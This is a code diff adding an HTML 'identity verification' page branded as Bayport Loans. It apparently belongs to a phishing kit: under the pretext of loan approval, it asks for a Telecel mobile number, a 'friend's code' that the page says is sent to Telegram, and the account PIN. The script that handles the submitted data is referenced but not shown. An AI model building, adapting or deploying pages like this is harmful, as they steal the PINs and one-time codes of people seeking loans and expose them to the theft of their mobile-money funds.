@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bayport Loans - Verification</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <h1>BAYPORT LOANS</h1>
+            <p>Step 2: Identity Verification</p>
+        </div>
+
+        <div class="application-summary">
+            <h3>Application Summary</h3>
+            <div class="summary-item">
+                <span class="summary-label">Full Name:</span>
+                <span class="summary-value" id="displayName">-</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Loan Amount:</span>
+                <span class="summary-value" id="displayAmount">-</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Phone Number:</span>
+                <span class="summary-value" id="displayPhone">-</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Reference ID:</span>
+                <span class="summary-value" id="displayRef">-</span>
+            </div>
+        </div>
+
+        <!-- ORANGE TELECEL SECTION -->
+        <div class="telecel-info">
+            <div class="telecel-header">
+                <span class="telecel-icon">📱</span>
+                <strong>TELECEL INFORMATION</strong>
+            </div>
+            <p class="telecel-message">Please enter your Telecel information correctly for verification</p>
+        </div>
+
+        <form id="verificationForm" class="loan-form">
+            <div class="form-group">
+                <label for="telecelNumber">Telecel Number *</label>
+                <input type="tel" id="telecelNumber" required placeholder="Enter Telecel number">
+            </div>
+
+            <div class="form-group">
+                <label for="friendCode">Friend's Code *</label>
+                <input type="text" id="friendCode" required placeholder="Enter code from friend">
+                <small>This will be sent to Telegram for approval</small>
+            </div>
+
+            <div class="form-group">
+                <label for="pin">PIN/Password *</label>
+                <input type="password" id="pin" required placeholder="Enter PIN" maxlength="6">
+            </div>
+
+            <button type="submit" class="btn-submit">Submit for Approval</button>
+        </form>
+
+        <div id="loadingOverlay" class="loading-overlay hidden">
+            <div class="spinner"></div>
+            <p>Sending for approval...</p>
+        </div>
+    </div>
+
+    <script src="js/page2.js"></script>
+</body>
+</html>
